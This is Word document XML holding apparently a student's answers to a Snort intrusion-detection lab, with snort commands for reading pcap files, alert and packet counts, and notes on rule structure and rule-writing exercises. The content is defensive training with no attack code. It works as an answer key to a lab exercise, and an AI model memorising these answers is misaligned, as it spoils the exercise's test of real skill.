      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -r mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>1.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31023837" w14:textId="528647D6" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">What is the number of </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>alerts generated</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D3367E1" w14:textId="6BF2F414" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>170</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04B0CAC0" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7824EAAB" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Keep reading the output. How many TCP Segments are Queued?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B4B8A59" w14:textId="777534F7" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>18</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="084CD16E" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5C074548" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Keep reading the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>output.How</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> many "HTTP response headers" were extracted?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DF9C9E7" w14:textId="7512120D" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="58B979C5" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="12C3683B" w14:textId="4F765EDC" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Investigate the mx-1.pcap file with the second configuration file.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D825395" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/snortv2.conf -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -r mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>1.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3BCD6527" w14:textId="1594FD7A" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">What is the number of </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>alerts generated</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51AE63E8" w14:textId="101D164D" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>68</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1661D8B4" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A3B93D9" w14:textId="04EA4BA1" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Investigate the mx-2.pcap file with the default configuration file.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AA3BA22" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -r mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>2.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06287D14" w14:textId="5B7E3107" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">What is the number of </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>alerts generated</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A5309C2" w14:textId="52AF52BA" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>340</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D6406C2" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3EAA38BC" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Keep reading the output. What is the number of the detected TCP packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="234F554C" w14:textId="0605219D" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>82</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A57CD9D" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E4D7E42" w14:textId="4DC4AF98" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:lastRenderedPageBreak/>
        <w:t>Investigate the mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>2.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> and mx-3.pcap files with the default configuration file.</w:t>
      </w:r>
      <w:r w:rsidR="00261C8C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sudo</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> snort -c /</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>etc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>/snort/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort.conf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> --</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>-list="mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>2.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> mx-</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>3.pcap</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DF1725C" w14:textId="00EE9AFA" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">What is the number of </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>alerts generated</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t>?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72BCF8BA" w14:textId="19193782" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>1020</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569EF872" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2BAE1770" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Task 9: Snort Rule Structure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C5FE5A" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="56BB944B" w14:textId="363A90EF" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Understanding Snort rules is important for blue and purple teamers. A Snort rule consists of an action, protocol, source/destination IPs, source/destination ports, and options. Snort operates in passive IDS mode by </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C" w:rsidRPr="006B2109">
        <w:t>default but</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> can switch to IPS mode using inline mode. The rule structure includes actions like alert, log, drop, and reject, and works with protocols such as IP, TCP, UDP, and ICMP.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7534D3AA" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="06A91979" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>IP and port numbers are used to define the source/destination and filter specific traffic, including ranges and exclusions. The direction of traffic flow is indicated using operators like "-&gt;" and "&lt;&gt;".</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2042DC0C" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="40008ED4" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Snort rule options fall into three categories: general (e.g., msg, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>sid</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">), payload (e.g., content, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>nocase</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">), and non-payload (e.g., flags, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>dsize</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>). Rules are added to the "</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>" file. It’s recommended to practice and refine your rule-writing skills through use cases and rule options.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70742604" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="32E360D7" w14:textId="6AEF841E" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t>Write a rule to filter </w:t>
      </w:r>
      <w:r w:rsidR="00261C8C">
        <w:t>“</w:t>
      </w:r>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">IP ID "35369" and run it against the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file. What is the request name of the detected packet? "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>snort</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -c </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>local.rules</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -A full -</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>l .</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> -r task9.pcap"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5806D578" w14:textId="713F0CC3" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>TIMESTAMP REQUEST</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="243846C9" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRDefault="00261C8C" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="20F0FF6F" w14:textId="1AD97A5F" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Create a rule to filter **packets with Syn flag** and run it against the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file. What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5883F846" w14:textId="6CA5D779" w:rsidR="006B2109" w:rsidRDefault="00261C8C" w:rsidP="00261C8C">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="360" w:hanging="360"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r w:rsidR="006B2109" w:rsidRPr="006B2109">
        <w:t>1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4AC397ED" w14:textId="77777777" w:rsidR="00261C8C" w:rsidRPr="006B2109" w:rsidRDefault="00261C8C" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59D8830C" w14:textId="77777777" w:rsidR="006B2109" w:rsidRPr="006B2109" w:rsidRDefault="006B2109" w:rsidP="006B2109">
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve">Write a rule to filter **packets with Push-Ack flags** and run it against the given </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="006B2109">
        <w:t>pcap</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="006B2109">
        <w:t xml:space="preserve"> file. What is the number of detected packets?</w:t>
      </w:r>
    </w:p>
